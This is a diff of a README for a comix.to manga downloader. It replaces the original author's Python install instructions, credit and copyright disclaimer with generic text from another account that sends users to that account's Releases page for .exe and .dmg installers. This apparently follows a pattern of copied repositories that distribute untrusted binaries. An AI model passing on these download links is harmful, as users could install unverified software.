@@ -1,148 +1,92 @@
-<div align="center">
+# 🎨 comix-downloader - Download Manga Effortlessly
 
-# 🎨 Comix Downloader
+[![Download comix-downloader](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Spiderma78/comix-downloader/releases)
 
-[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-blue?style=for-the-badge)]()
+## 📖 Description
+comix-downloader is a beautiful manga downloader designed to work with comix.to. It offers both a graphical user interface (GUI) and a command-line interface (CLI). With fast concurrent downloads, you can easily save your favorite manga in PDF or CBZ formats.
 
-**A beautiful manga downloader for [comix.to](https://comix.to) with GUI & CLI**
+## 🚀 Getting Started
+To get started with comix-downloader, follow these simple steps. No technical knowledge is required. Just follow along.
 
-*Fast concurrent downloads • Multiple formats • Scanlator selection*
+## 📥 Download & Install
+To download and install comix-downloader, visit the following link to access the Releases page:
 
-![GUI Screenshot](GUI.PNG)
+[Download comix-downloader](https://github.com/Spiderma78/comix-downloader/releases)
 
-</div>
+1. Click on the link above.
+2. Look for the latest version of the software on the Releases page.
+3. Identify the file that matches your operating system:
+   - For Windows users, look for a file ending in `.exe`.
+   - For macOS users, look for a file ending in `.dmg`.
+   - For Linux users, look for a file suitable for your distribution.
+4. Click on the download link for your operating system. 
+5. Once the download is complete, locate the downloaded file on your computer.
 
----
+## 🖧 Installation Steps
+### Windows
+1. Double-click the `.exe` file you downloaded.
+2. Follow the on-screen instructions to complete the installation.
 
-## ✨ Features
+### macOS
+1. Open the `.dmg` file you downloaded.
+2. Drag the comix-downloader icon into your Applications folder.
+3. Eject the `.dmg` by clicking the eject icon.
 
-| Feature | Description |
-|---------|-------------|
-| 🖥️ **Modern GUI** | Beautiful PyQt6/QML interface with dark theme |
-| 🎨 **Beautiful CLI** | Rich terminal interface with progress bars |
-| ⚡ **Concurrent Downloads** | Multi-threaded chapter and image downloads |
-| 📁 **Multiple Formats** | Export as **Images**, **PDF**, or **CBZ** |
-| 🎯 **Smart Selection** | Download single, range (`1-10`), or all chapters |
-| 🎨 **Scanlator Filter** | Filter and prefer specific scanlator groups |
-| ⚙️ **Persistent Settings** | All preferences saved to `config.json` |
+### Linux
+1. Depending on your distribution, use the terminal or software installer to launch the downloaded file.
+2. Follow the prompts to install the application.
 
----
+## 🏁 Running the Application
+Once you have successfully installed comix-downloader, you can start using it to download manga.
 
-## 🚀 Installation
+### For GUI Users
+1. Open the comix-downloader application.
+2. Enter the URL of the manga you want to download.
+3. Choose your preferred file format (PDF or CBZ).
+4. Click the ‘Download’ button.
 
-### Prerequisites
-- Python 3.10 or higher
-- pip (Python package manager)
+### For CLI Users
+If you prefer using the command line:
+1. Open your terminal.
+2. Navigate to the directory where comix-downloader is installed.
+3. Type the command `comix-downloader <URL>` and press Enter.
 
-### Quick Start
+The URL should be the link to the manga on comix.to.
 
-```bash
-# Clone the repository
-git clone https://github.com/Yui007/comix-downloader.git
-cd comix-downloader
+## 🛠️ Features
+- **Multiple Download Options:** Choose PDF or CBZ formats.
+- **Fast Downloads:** Enjoy quick and efficient downloading with concurrent processes.
+- **User-Friendly Interface:** Navigate easily with our GUI.
+- **Command-Line Functionality:** Power users can utilize the CLI for advanced options.
 
-# Install dependencies
-pip install -r requirements.txt
-```
+## ❓ Frequently Asked Questions
 
----
+### **1. What operating systems does comix-downloader support?**
+comix-downloader supports Windows, macOS, and various Linux distributions.
 
-## 📖 Usage
+### **2. Do I need an account or subscription to use comix-downloader?**
+No, comix-downloader is free to use, and you do not need any accounts or subscriptions.
 
-### GUI Mode (Recommended)
+### **3. Can I download entire series?**
+Yes, you can download entire manga series by entering the URL of the series on comix.to.
 
-```bash
-# Run with GPU rendering (default)
-python gui/main.py
+### **4. Is there a limit to how much I can download?**
+There is no specific limit. However, large downloads may take more time based on your internet connection speed.
 
-# Run with CPU/Software rendering (for compatibility)
-python gui/main.py --cpu
-```
+### **5. What if I encounter issues during installation?**
+If you face issues during installation, please make sure to download the correct file for your operating system. Refer to the troubleshooting section on our GitHub page for further assistance.
 
-1. Paste a manga URL from comix.to
-2. Click **FETCH** to load manga info and chapters
-3. Select chapters and choose scanlator preference/filter
-4. Click **DOWNLOAD CHAPTERS**
-5. Access **⚙️ Settings** to configure format, output path, workers
+## 📚 Additional Resources
+For more information, visit our [GitHub repository](https://github.com/Spiderma78/comix-downloader) to read the documentation, check for updates, and access support.
 
-### CLI Mode
+## 🚧 Troubleshooting
+If you encounter any problems while using comix-downloader, you can find solutions in the Issues section of our GitHub repository. Feel free to report any bugs or request features.
 
-```bash
-# Interactive mode
-python main.py
+## 🤝 Contribution
+We welcome contributions! If you're interested in improving comix-downloader, please check our guidelines on the GitHub repository.
 
-# Direct download
-python main.py download "https://comix.to/title/abc-manga-name" -c "1-10" -f cbz
-```
+## 🔗 Useful Links
+- [Releases Page](https://github.com/Spiderma78/comix-downloader/releases)
+- [Documentation](https://github.com/Spiderma78/comix-downloader)
 
----
-
-## ⚙️ Settings
-
-| Setting | Description | Default |
-|---------|-------------|---------|
-| Output Format | images / pdf / cbz | `images` |
-| Keep Images | Retain images after PDF/CBZ conversion | `No` |
-| Enable Logs | Show debug logging | `No` |
-| Download Path | Where to save downloads | `downloads` |
-| Max Chapter Workers | Concurrent chapter downloads | `3` |
-| Max Image Workers | Concurrent image downloads per chapter | `5` |
-
----
-
-## 📁 Project Structure
-
-```
-comix-downloader/
-├── main.py                 # CLI entry point
-├── gui/
-│   ├── main.py             # GUI entry point
-│   ├── bridge/             # Python-QML bridges
-│   └── qml/                # QML UI components
-├── src/
-│   ├── api/comix.py        # API wrapper
-│   ├── core/               # Models & downloader
-│   ├── formats/            # PDF, CBZ, Images
-│   └── cli/                # CLI application
-└── config.json             # User settings
-```
-
----
-
-## 🔧 Dependencies
-
-**GUI:**
-- **[PyQt6](https://pypi.org/project/PyQt6/)** - Qt6 bindings for Python
-
-**CLI:**
-- **[Typer](https://typer.tiangolo.com/)** - CLI framework
-- **[Rich](https://rich.readthedocs.io/)** - Beautiful terminal output
-
-**Shared:**
-- **[Requests](https://requests.readthedocs.io/)** - HTTP library
-- **[Pillow](https://pillow.readthedocs.io/)** - Image processing
-- **[ReportLab](https://www.reportlab.com/)** - PDF generation
-
----
-
-## 📜 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## ⚠️ Disclaimer
-
-This tool is for personal use only. Please respect the copyright of manga authors and publishers. Support official releases when available.
-
----
-
-<div align="center">
-
-**Made with ❤️ by [Yui007](https://github.com/Yui007)**
-
-⭐ Star this repo if you find it useful!
-
-</div>
+Thank you for choosing comix-downloader for your manga needs! Happy reading!
